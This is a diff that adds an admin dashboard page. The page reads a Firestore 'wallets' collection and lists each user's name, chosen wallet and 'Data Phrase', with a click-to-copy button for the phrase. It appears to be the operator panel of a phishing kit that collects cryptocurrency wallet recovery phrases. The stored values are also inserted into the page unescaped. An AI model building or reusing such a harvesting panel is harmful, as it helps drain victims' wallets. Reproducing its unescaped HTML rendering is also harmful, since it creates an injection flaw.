@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.5">
+    <title>Admin Dashboard</title>
+    <link rel="icon" href="../static/images/flarelogo.png">
+    <link rel="stylesheet" href="../css/admin.css">
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+</head>
+<body>
+    <div class="container dashboard">
+        <h2>Admin Dashboard - Wallet Data</h2>
+        <button id="logoutBtn" class="btn-logout">Logout</button>
+
+        <div id="loadingMessage" class="empty-state">Loading data...</div>
+        <div id="emptyState" class="empty-state" style="display: none;">
+            No wallet data available.
+        </div>
+        
+        <table id="walletTable" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Username</th>
+                    <th>Wallet Selected</th>
+                    <th>Data Phrase</th>
+                    <th>Created At</th>
+                </tr>
+            </thead>
+            <tbody id="walletTableBody">
+                <!-- Wallet data will be inserted here -->
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Custom scripts -->
+    <script src="../js/firebase-config.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const logoutBtn = document.getElementById('logoutBtn');
+            const walletTable = document.getElementById('walletTable');
+            const walletTableBody = document.getElementById('walletTableBody');
+            const loadingMessage = document.getElementById('loadingMessage');
+            const emptyState = document.getElementById('emptyState');
+            
+            // Handle logout
+            logoutBtn.addEventListener('click', async function() {
+                try {
+                    await firebase.auth().signOut();
+                    window.location.href = 'login.html';
+                } catch (error) {
+                    console.error('Logout error:', error);
+                    alert('An error occurred during logout.');
+                }
+            });
+            
+            // Load wallet data
+            async function loadWalletData() {
+                try {
+                    const snapshot = await firebase.firestore().collection('wallets')
+                        .orderBy('created_at', 'desc')
+                        .get();
+                        
+                    if (snapshot.empty) {
+                        loadingMessage.style.display = 'none';
+                        emptyState.style.display = 'block';
+                        return;
+                    }
+                    
+                    let walletData = [];
+                    snapshot.forEach(doc => {
+                        walletData.push({
+                            id: doc.id,
+                            ...doc.data()
+                        });
+                    });
+                    
+                    renderWalletTable(walletData);
+                } catch (error) {
+                    console.error('Error loading wallet data:', error);
+                    loadingMessage.textContent = 'Error loading data. Please try again.';
+                }
+            }
+            
+            // Render wallet table
+            function renderWalletTable(walletData) {
+                walletTableBody.innerHTML = '';
+                
+                walletData.forEach(wallet => {
+                    const row = document.createElement('tr');
+                    
+                    // Format timestamp
+                    const timestamp = wallet.created_at ? 
+                        new Date(wallet.created_at.seconds * 1000).toLocaleString() : 
+                        'Unknown';
+                    
+                    row.innerHTML = `
+                        <td>${wallet.id}</td>
+                        <td>${wallet.username || 'Unknown User'}</td>
+                        <td>${wallet.wallet_selected || 'Unknown'}</td>
+                        <td class="copyable" data-copy="${wallet.data_phrase || ''}">
+                            ${wallet.data_phrase || ''}
+                            <span class="tooltip">[Click to copy]</span>
+                        </td>
+                        <td>${timestamp}</td>
+                    `;
+                    
+                    walletTableBody.appendChild(row);
+                });
+                
+                loadingMessage.style.display = 'none';
+                walletTable.style.display = 'table';
+                
+                // Setup copy functionality
+                setupCopyFunctionality();
+            }
+            
+            // Setup copy functionality
+            function setupCopyFunctionality() {
+                const copyables = document.querySelectorAll('.copyable');
+                copyables.forEach(el => {
+                    el.addEventListener('click', function() {
+                        const text = this.getAttribute('data-copy');
+                        navigator.clipboard.writeText(text).then(() => {
+                            this.classList.add('copied');
+                            const tooltip = this.querySelector('.tooltip');
+                            tooltip.textContent = '[Copied!]';
+                            setTimeout(() => {
+                                this.classList.remove('copied');
+                                tooltip.textContent = '[Click to copy]';
+                            }, 2000);
+                        }).catch(err => {
+                            console.error('Failed to copy: ', err);
+                            alert('Failed to copy. Please try again or copy manually.');
+                        });
+                    });
+                });
+            }
+            
+            // Check authentication and load data
+            firebase.auth().onAuthStateChanged(user => {
+                if (user) {
+                    loadWalletData();
+                } else {
+                    window.location.href = 'login.html';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
